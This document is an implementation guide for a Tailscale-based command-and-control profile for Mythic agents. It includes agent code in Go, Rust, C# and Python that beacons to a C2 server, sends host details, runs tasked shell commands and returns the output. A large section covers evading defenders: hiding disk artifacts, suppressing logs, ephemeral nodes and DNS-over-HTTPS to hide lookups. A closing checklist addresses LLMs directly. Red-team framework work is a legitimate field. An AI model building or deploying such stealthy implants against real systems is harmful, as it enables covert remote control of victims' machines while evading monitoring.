# Tailscale C2 Implementation Guide

A complete specification for integrating the Tailscale C2 profile into any Mythic agent, in any programming language.

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Build-Time Integration](#build-time-integration)
4. [Agent-Side Implementation](#agent-side-implementation)
5. [Protocol Specification](#protocol-specification)
6. [Language-Specific Examples](#language-specific-examples)
7. [OPSEC](#opsec)
8. [Testing](#testing)

---

## Overview

The Tailscale C2 profile provides agent communication over a WireGuard-encrypted mesh VPN. From the agent's perspective, the protocol is simple HTTP — the only difference from a standard HTTP C2 is that HTTP requests are sent through a Tailscale network instead of the public internet.

**What the agent needs to do:**

1. Join a Tailscale/Headscale network using a pre-auth key
2. Send HTTP POST requests to the C2 server's tailnet hostname
3. Use the standard Mythic message format (`base64(UUID + JSON)`)

For step 1, you can use [libtailscale](https://github.com/tailscale/libtailscale) — Tailscale's official C library for embedding Tailscale networking into any application. It wraps Go's `tsnet` package and provides a C API callable from any language with FFI support. The library also ships with Python (pybind11), Ruby (FFI), and Swift (TailscaleKit) bindings.

**What the C2 server handles:**

- Joining the same tailnet
- Receiving HTTP POSTs from agents
- Forwarding messages to the Mythic server
- Relaying responses back

---

## Architecture

```
+-------------------+         +-------------------+         +-------------------+
|                   |  HTTP   |                   |  HTTP   |                   |
|   Agent           | ------> |   C2 Server       | ------> |   Mythic Server   |
|   (tsnet client)  |  over   |   (tsnet server)  |         |   :17443          |
|                   |  VPN    |   :8080           |         |                   |
+-------------------+         +-------------------+         +-------------------+
        |                              |
        |     WireGuard Tunnel         |
        +------------------------------+
        via Tailscale/Headscale control plane
```

---

## Build-Time Integration

### 1. Register the C2 Profile

In your agent's `builder.py`, add `"tailscale"` to `c2_profiles`:

```python
class MyAgent(PayloadType):
    c2_profiles = ["http", "tailscale"]  # add tailscale
```

### 2. Call generate_config RPC

During the build, call the tailscale profile's `generate_config` RPC to get a pre-auth key:

```python
async def build(self) -> BuildResponse:
    for c2 in self.c2info:
        profile = c2.get_c2profile()
        if profile["name"] == "tailscale":
            params = c2.get_parameters_dict()

            # Get encryption key if configured
            enc_key = None
            aespsk_param = params.get("AESPSK", None)
            if isinstance(aespsk_param, dict):
                enc_key = aespsk_param.get("enc_key", None)
            elif isinstance(aespsk_param, str) and aespsk_param != "none":
                enc_key = aespsk_param

            # Call RPC
            rpc_resp = await SendMythicRPCOtherServiceRPC(
                MythicRPCOtherServiceRPCMessage(
                    ServiceName="tailscale",
                    ServiceRPCFunction="generate_config",
                    ServiceRPCFunctionArguments={
                        "payload_uuid": self.uuid,
                        "killdate": params.get("killdate", ""),
                        "enc_key": enc_key,
                    },
                )
            )

            config = json.loads(rpc_resp.Result)
            # config contains:
            # {
            #   "auth_key":        "tskey-auth-...",
            #   "control_url":     "https://..." or "",
            #   "server_hostname": "mythic-c2",
            #   "server_port":     "8080",
            #   "tcp_port":        "8081"
            # }
```

### 3. Stamp Configuration

Inject the four values into your agent at compile time using whatever mechanism your language supports (ldflags, const replacement, config file embedding, etc.):

| Value | Description | Example |
|-------|-------------|---------|
| `auth_key` | Ephemeral pre-auth key for the agent | `tskey-auth-kBs5MA...` |
| `control_url` | Tailscale/Headscale control plane URL (empty = Tailscale cloud) | `https://headscale.example.com` |
| `server_hostname` | C2 server's hostname on the tailnet | `mythic-c2` |
| `server_port` | C2 server's HTTP listen port | `8080` |
| `tcp_port` | C2 server's TCP listen port (from `generate_config` response) | `8081` |

The transport protocol (`http` or `tcp`) is an **agent build parameter**, not a C2 profile parameter. This way agents that only implement HTTP don't expose a TCP option. Agents that support both (like cercopes and Kassandra) add a `tailscale_protocol` build parameter with choices `["http", "tcp"]`.

Also stamp the standard Mythic values: `payload_uuid`, `callback_interval`, `callback_jitter`.

---

## Agent-Side Implementation

### Step 1: Initialize Tailscale

Create a tsnet client and join the network. The key requirements:

- Set `Ephemeral: true` — the node is removed from the tailnet on disconnect
- Use an in-memory state store — don't write keys to disk
- Set `Dir` to a temporary directory — **do not** leave it unset (see [OPSEC](#opsec) section)
- Suppress tsnet logging with a no-op `Logf` — prevents log files being written to `Dir`
- Set `AuthKey` to the stamped pre-auth key
- Set `ControlURL` if using Headscale (leave empty for Tailscale cloud)
- Set `Hostname` to something unique (e.g., `agent-<uuid_prefix>`)
- Clean up the temp directory on exit (`os.RemoveAll` / equivalent)

Wait for the network to be ready before proceeding.

### Step 2: Create HTTP Client

Get an HTTP client that routes through the tailnet. In Go this is `tsServer.HTTPClient()`. In other languages, use [libtailscale](https://github.com/tailscale/libtailscale)'s `tailscale_dial()` to open a TCP connection through the tailnet, or build a thin Go FFI wrapper that exposes an HTTP POST function (see the Kassandra/Rust example).

### Step 3: Checkin

Send the standard Mythic checkin message:

```
POST http://<server_hostname>:<server_port>/agent_message
Content-Type: application/octet-stream
Body: base64(<payload_uuid> + <checkin_json>)
```

Checkin JSON:
```json
{
  "action": "checkin",
  "uuid": "<payload_uuid>",
  "ips": ["<agent_ip>"],
  "os": "<linux|windows|darwin>",
  "user": "<username>",
  "host": "<hostname>",
  "pid": 1234,
  "architecture": "<amd64|arm64>",
  "domain": "",
  "integrity_level": 2,
  "process_name": "<binary_name>",
  "external_ip": ""
}
```

Parse the response:
```
Response body: base64(<new_callback_id> + <response_json>)
```
```json
{
  "action": "checkin",
  "id": "<callback_id>",
  "status": "success"
}
```

Save the `id` value — use it as the UUID for all subsequent messages.

### Step 4: Tasking Loop

Repeat on the callback interval (with jitter):

**Request tasking:**
```json
{
  "action": "get_tasking",
  "tasking_size": -1
}
```

Wrap as: `base64(<callback_id> + <json>)`, POST to the same endpoint.

**Parse response:**
```json
{
  "action": "get_tasking",
  "tasks": [
    {
      "command": "shell",
      "parameters": "{\"command\": \"whoami\"}",
      "id": "<task_id>",
      "timestamp": 1234567890
    }
  ]
}
```

**Execute tasks and post responses:**
```json
{
  "action": "post_response",
  "responses": [
    {
      "task_id": "<task_id>",
      "user_output": "root\n",
      "completed": true,
      "status": "success"
    }
  ]
}
```

### Step 5: Sleep with Jitter

```
actual_sleep = interval + random(0, interval * jitter / 100)
```

---

## Protocol Specification

### Message Encoding

All messages follow the same pattern:

```
HTTP Body = base64( UUID + payload )
```

- **UUID**: 36-character string (the payload UUID before checkin, the callback ID after)
- **payload**: JSON string (optionally encrypted)

### Optional AES-256 Encryption

When `AESPSK` is set to `aes256_hmac`, the payload is encrypted before base64 encoding:

```
encrypted_payload = IV (16 bytes) + AES-256-CBC(key, IV, PKCS7_pad(json)) + HMAC-SHA256(key, IV + ciphertext)
```

- **Key**: 32-byte AES key (base64-decoded from `AESPSK` parameter)
- **IV**: 16 random bytes
- **Encryption**: AES-256-CBC with PKCS7 padding
- **HMAC**: SHA-256 over IV + ciphertext, using the same 32-byte key
- **Wire format**: `base64(UUID + IV + ciphertext + HMAC)`

Decryption: verify HMAC first (constant-time comparison), then decrypt.

### Transport Protocols

The C2 profile supports two transport protocols, selectable at build time:

#### HTTP (default)

| Field | Value |
|-------|-------|
| Method | POST |
| URL | `http://<server_hostname>:<server_port>/agent_message` |
| Content-Type | `application/octet-stream` |
| Response | base64-encoded body in the same format |

Best for compatibility with existing agents that already implement HTTP transport.

#### Raw TCP (lower overhead)

Uses a persistent TCP connection with length-prefixed binary framing:

```
[4-byte big-endian length][payload]
```

- **Connection**: Agent dials `<server_hostname>:<tcp_port>` through the tailnet and keeps the connection open
- **Send**: Write `uint32(len(payload))` + `payload` (the same base64 string used by HTTP)
- **Receive**: Read `uint32(len(response))` + `response`
- **Reconnect**: If the connection drops, re-dial and retry
- **Max message size**: 16MB

The TCP transport eliminates HTTP header overhead and connection setup per request. Since all traffic is already WireGuard-encrypted, the HTTP framing adds no security value.

The C2 server does not modify message contents — it is a transparent proxy in both modes.

### Task Parameter Parsing

Mythic sends task parameters as a JSON string in the `parameters` field. The JSON keys match the `name` field of the `CommandParameter` definitions. When the Mythic UI sends parameters via its modal dialog, the keys may use the `cli_name` instead — your `parse_arguments` method should handle both by calling `self.load_args_from_json_string()` when the input starts with `{`.

Example:
```python
async def parse_arguments(self):
    if len(self.command_line.strip()) == 0:
        return
    if self.command_line.strip()[0] == "{":
        self.load_args_from_json_string(self.command_line)
    else:
        self.add_arg("path", self.command_line.strip())
```

---

## Language-Specific Examples

### Go (Direct tsnet)

The simplest integration. Import `tsnet` directly:

```go
import (
    "tailscale.com/tsnet"
    "tailscale.com/ipn/store/mem"
)

srv := &tsnet.Server{
    Hostname:  "agent-" + uuid[:8],
    AuthKey:   authKey,
    ControlURL: controlURL,  // empty for Tailscale cloud
    Ephemeral: true,
    Store:     new(mem.Store),
}

status, err := srv.Up(ctx)
client := srv.HTTPClient()

// Use client.Post() for all Mythic communication
resp, err := client.Post(
    "http://mythic-c2:8080/agent_message",
    "application/octet-stream",
    strings.NewReader(base64payload),
)
```

// For TCP mode, use Dial() instead of HTTPClient():
conn, err := srv.Dial(ctx, "tcp", "mythic-c2:8081")
// Then use length-prefixed framing:
binary.Write(conn, binary.BigEndian, uint32(len(payload)))
conn.Write(payload)
// Read response:
binary.Read(conn, binary.BigEndian, &respLen)
io.ReadFull(conn, respBuf[:respLen])
```

**Binary size**: ~15-20MB (includes Go runtime + tsnet + WireGuard)

See: `Payload_Type/cercopes/cercopes/agent_code/main.go`

### Rust (via Go FFI)

Use `libtailscale` or a thin Go wrapper compiled as a C static library (`c-archive`):

```rust
// FFI declarations
extern "C" {
    fn ts_init(auth_key: *const i8, control_url: *const i8, hostname: *const i8) -> i32;
    fn ts_http_post(url: *const i8, body: *const u8, body_len: i32,
                    resp: *mut u8, resp_len: i32) -> i32;
    fn ts_close();
}

// Initialize
let auth = CString::new(auth_key)?;
let ctrl = CString::new(control_url)?;
let host = CString::new(hostname)?;
unsafe { ts_init(auth.as_ptr(), ctrl.as_ptr(), host.as_ptr()); }

// Send message
let url = CString::new("http://mythic-c2:8080/agent_message")?;
let mut resp_buf = vec![0u8; 4 * 1024 * 1024];
let n = unsafe {
    ts_http_post(url.as_ptr(), body.as_ptr(), body.len() as i32,
                 resp_buf.as_mut_ptr(), resp_buf.len() as i32)
};
```

**Build**: Cross-compile the Go library with `CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows go build -buildmode=c-archive -ldflags="-s -w"`

**Binary size overhead**: ~15-20MB from the Go static library

See: Kassandra agent integration in `appollos3/Kassandra/`

### C# / .NET (via P/Invoke to libtailscale)

Use [libtailscale](https://github.com/tailscale/libtailscale)'s C API via P/Invoke. Build libtailscale as a shared library (`go build -buildmode=c-shared`) and call it from C#:

```csharp
// Using libtailscale's native C API
[DllImport("libtailscale")]
static extern int tailscale_new();

[DllImport("libtailscale")]
static extern int tailscale_set_authkey(int sd, string authkey);

[DllImport("libtailscale")]
static extern int tailscale_set_hostname(int sd, string hostname);

[DllImport("libtailscale")]
static extern int tailscale_set_ephemeral(int sd, int ephemeral);

[DllImport("libtailscale")]
static extern int tailscale_up(int sd);

[DllImport("libtailscale")]
static extern int tailscale_dial(int sd, string network, string addr, out int conn);

// Or use a thin Go FFI wrapper like the Rust example:
[DllImport("tailscale_ffi")]
static extern int ts_init(string authKey, string controlUrl, string hostname);

[DllImport("tailscale_ffi")]
static extern int ts_http_post(string url, byte[] body, int bodyLen,
                                byte[] resp, int respLen);
```

### Python (via libtailscale pybind11 bindings)

[libtailscale](https://github.com/tailscale/libtailscale) ships with Python bindings built on pybind11. See `libtailscale/python/` for the full API:

```python
# Using libtailscale's Python bindings
from tailscale import TSNet

ts = TSNet(ephemeral=True)
ts.set_authkey("tskey-auth-...")
ts.set_hostname("agent-abc")
ts.up()

# Dial through the tailnet and send HTTP manually
conn = ts.dial("tcp", "mythic-c2:8080")
# ... write HTTP POST, read response ...

# Or use ctypes with a custom Go FFI wrapper
import ctypes
lib = ctypes.CDLL("./libtailscale_ffi.so")
lib.ts_init(b"tskey-auth-...", b"https://...", b"agent-abc")

body = base64_payload.encode()
resp = (ctypes.c_char * 4194304)()
n = lib.ts_http_post(b"http://mythic-c2:8080/agent_message",
                     body, len(body), resp, len(resp))
```

### Any Language with HTTP Support

If your language can't easily do FFI, run Tailscale as a sidecar:

1. Deploy the Tailscale CLI alongside your agent
2. Run `tailscale up --authkey=<key>` to join the network
3. Use regular HTTP requests to `http://mythic-c2:8080/agent_message`

This requires Tailscale installed on the target but avoids FFI complexity.

---

## OPSEC

### Disk Artifacts

By default, tsnet creates a working directory at a well-known, predictable location:

| OS | Default path |
|----|-------------|
| Windows | `%APPDATA%\tsnet-<hostname>\` |
| Linux | `~/.config/tsnet-<hostname>/` |
| macOS | `~/Library/Application Support/tsnet-<hostname>/` |

This directory contains WireGuard keys, log files, and internal state — all of which are detectable forensic artifacts and immediately identify the process as a Tailscale client.

**Mitigations (all required):**

1. **Set `Dir` to a temporary directory** — redirect tsnet's working files to a random temp path (e.g., `os.MkdirTemp("", "ts-")`) instead of the default user-config location. This avoids the obvious `tsnet-*` directory name.

2. **Use `mem.Store` for key storage** — keeps WireGuard private keys in memory only. Without this, keys are written to the `Dir` as JSON files.

3. **Suppress logging with a no-op `Logf`** — tsnet writes verbose logs to its `Dir` by default. Setting `Logf: func(string, ...any) {}` prevents log file creation entirely.

4. **Clean up `Dir` on exit** — `defer os.RemoveAll(tmpDir)` ensures nothing is left behind when the agent terminates.

Example (Go):
```go
tmpDir, _ := os.MkdirTemp("", "ts-")
defer os.RemoveAll(tmpDir)

srv := &tsnet.Server{
    Dir:       tmpDir,
    Hostname:  "agent-" + uuid[:8],
    AuthKey:   authKey,
    Ephemeral: true,
    Store:     new(mem.Store),
    Logf:      func(string, ...any) {},
}
```

For FFI-based agents (Rust, C#, etc.), the Go wrapper should handle the temp directory internally — see `tailscale_ffi/main.go` for the pattern.

### Network Artifacts — Outbound Connection Overview

A firewall or network monitor observing the agent process will see the following outbound connections:

#### Startup Phase (one-time)

```
Agent ──HTTPS──▶ controlplane.tailscale.com:443     Registration, key exchange, peer discovery
Agent ──HTTPS──▶ login.tailscale.com:443             Auth (may be skipped with pre-auth keys)
Agent ──UDP────▶ derpN.tailscale.com:3478             STUN — NAT type detection / hole-punching
```

With Headscale: all control plane traffic goes to your self-hosted URL instead.

#### Steady State — Data Path (one of the following)

**Scenario A: Direct WireGuard (both peers have reachable IPs or NAT traversal succeeds)**

```
Agent ──UDP────▶ <C2 server public IP>:41641          Direct WireGuard tunnel
```

Single persistent UDP flow on a high port. Looks like a standard VPN connection.

**Scenario B: Relayed via DERP (corporate NAT/firewall blocks direct UDP)**

```
Agent ──HTTPS──▶ derpN.tailscale.com:443              WireGuard traffic relayed over WebSocket
```

Looks like a long-lived HTTPS connection to a Tailscale relay server. Indistinguishable from legitimate Tailscale usage.

#### Full Connection Table

| Phase | Destination | Port | Protocol | Purpose | When |
|-------|------------|------|----------|---------|------|
| Startup | `controlplane.tailscale.com` | 443 | HTTPS | Node registration & coordination | Always |
| Startup | `login.tailscale.com` | 443 | HTTPS | Auth endpoint | Pre-auth key may skip |
| Startup | `derpN.tailscale.com` | 3478 | UDP | STUN NAT detection | Always |
| Data | C2 server's public IP | 41641 | UDP | Direct WireGuard tunnel | If reachable |
| Data | `derpN.tailscale.com` | 443 | HTTPS | DERP relay (fallback) | If direct fails |
| DNS | System resolver | 53 | UDP | Resolve Tailscale hostnames | Always (unless DoH) |

With **Headscale**: replace `controlplane.tailscale.com` and `login.tailscale.com` with your domain. DERP relays can also be self-hosted, making the entire traffic pattern point to operator-controlled infrastructure.

#### DNS-over-HTTPS (DoH)

The DNS row above is often the most obvious fingerprint — corporate DNS logs will show queries for `controlplane.tailscale.com` and `derpN.tailscale.com` before the agent connects.

Agents can set the `doh` build parameter to route Tailscale-related DNS through an encrypted HTTPS resolver:

| Choice | Resolver URL | Notes |
|--------|-------------|-------|
| `off` | System DNS | Default — queries visible in DNS logs |
| `cloudflare` | `https://1.1.1.1/dns-query` | RFC 8484 DoH to Cloudflare |
| `google` | `https://8.8.8.8/dns-query` | RFC 8484 DoH to Google |
| `custom` | `doh_url` build parameter | Operator-controlled DoH resolver |

**Selective routing**: DoH is only applied to domains that would reveal Tailscale usage — all other DNS queries use the system resolver so the agent can still resolve internal/corporate hostnames normally. The domains routed through DoH are:

- `*.tailscale.com` — control plane (`controlplane.tailscale.com`, `login.tailscale.com`), logging (`log.tailscale.com`), and DERP relay hostnames (`derpN.tailscale.com`)
- The Headscale control URL hostname — automatically extracted from the `control_url` parameter (e.g., `headscale.example.com`)

Implementation: DNS interception is applied at three layers before `tsnet.Up()`:

1. **`dnscache.Get().Forward`** — the critical layer. tsnet's `dnscache` package creates a global singleton resolver at package init with `&net.Resolver{PreferGo: true}` (nil `Dial`). Both `controlhttp` (for `controlplane.tailscale.com`) and `logpolicy` (for `log.tailscale.com`) resolve DNS through `dnscache.Get().Forward`, completely bypassing `net.DefaultResolver`. Setting `.Forward` to our DoH resolver intercepts these lookups at the source.
2. **`net.DefaultResolver`** — overridden with the same DoH resolver to catch any direct `net.LookupHost()` calls
3. **`http.DefaultTransport.DialContext`** — patched with a `shouldDoH()` filter for selective resolution; non-matching domains fall through to a snapshot of the original system resolver

The DoH resolver sends raw DNS wire-format queries as `application/dns-message` POST requests (RFC 8484) to the configured DoH URL. See `setupDoH()` in cercopes `main.go` or `ts_set_doh()` in `tailscale_ffi/main.go`.

Since the DoH resolver addresses are IP literals (`1.1.1.1`, `8.8.8.8`), no DNS lookup is needed to reach them — the system DNS server never sees any Tailscale-related queries, while local domain resolution remains fully functional.

#### What Defenders See

| Environment | Observed traffic | Blends with |
|------------|-----------------|-------------|
| Enterprise with Tailscale | HTTPS to Tailscale + UDP tunnel | Legitimate Tailscale users |
| Enterprise without Tailscale | HTTPS to `tailscale.com` domains | Unusual — may trigger alerts |
| With DoH enabled | No Tailscale DNS queries, HTTPS to 1.1.1.1/8.8.8.8 | Common DoH traffic |
| With self-hosted Headscale | HTTPS/UDP to your domain only | Generic VPN / cloud traffic |

**Key takeaway**: In environments where Tailscale is already in use, agent traffic is effectively invisible in network logs. In environments without Tailscale, the `tailscale.com` domains are a fingerprint — use DoH to eliminate DNS artifacts, or Headscale with self-hosted DERP relays to avoid Tailscale infrastructure entirely.

### Node Visibility

- Agents join the tailnet as **ephemeral nodes** — they are automatically removed from the tailnet when they disconnect, leaving no persistent record in the Tailscale/Headscale admin console.
- Pre-auth keys are scoped to `tag:agent` with ACLs restricting access to only the C2 server's listen port(s). Compromised keys cannot access other devices on the tailnet.

---

## Testing

### Local Testing with Headscale

1. Run a Headscale instance:
   ```bash
   docker run -v ./config:/etc/headscale ghcr.io/juanfont/headscale:latest serve
   ```

2. Create an API key and user:
   ```bash
   headscale apikeys create
   headscale users create mythic
   ```

3. Configure the C2 profile with `provider: "headscale"` and your Headscale URL.

4. Start the C2 profile, build a payload, and run it.

5. Verify the agent appears in Headscale:
   ```bash
   headscale nodes list
   ```

### Verifying Communication

Check the C2 server logs:
```bash
sudo docker logs tailscale
```

Check the agent's Tailscale IP:
```bash
# In agent logs, look for:
# [+] tsnet is up! Tailscale IP: [100.x.y.z]
```

### Common Issues

| Issue | Cause | Fix |
|-------|-------|-----|
| Agent hangs on startup | Pre-auth key expired or invalid | Generate a new payload |
| `tsnet.Up` timeout | Can't reach control plane | Check network/firewall, verify `control_url` |
| HTTP 404 from C2 server | Wrong hostname or port | Verify `server_hostname` matches C2 server's tailnet hostname |
| Empty responses | Mythic server not reachable from C2 container | Check `MYTHIC_ADDRESS` env var and Docker networking |

---

## Minimal Implementation Checklist

For LLMs or developers implementing this protocol in a new agent:

- [ ] Add `"tailscale"` to `c2_profiles` in `builder.py`
- [ ] Call `generate_config` RPC during build to get auth key
- [ ] Stamp `auth_key`, `control_url`, `server_hostname`, `server_port`, `protocol`, `tcp_port` into agent
- [ ] Implement tsnet initialization (direct import or FFI)
- [ ] Use in-memory state store and ephemeral mode
- [ ] Set `Dir` to a temp directory, suppress `Logf`, clean up on exit (see [OPSEC](#opsec))
- [ ] Create HTTP client routed through tsnet (or TCP connection if using `tcp` protocol)
- [ ] Send checkin: `POST base64(uuid + checkin_json)` to `http://<hostname>:<port>/agent_message`
- [ ] Parse checkin response, extract callback ID
- [ ] Implement tasking loop: `get_tasking` -> execute -> `post_response`
- [ ] Handle `parse_arguments` for both JSON and raw string inputs
- [ ] Implement sleep with jitter between callbacks
- [ ] Clean up tsnet state on exit
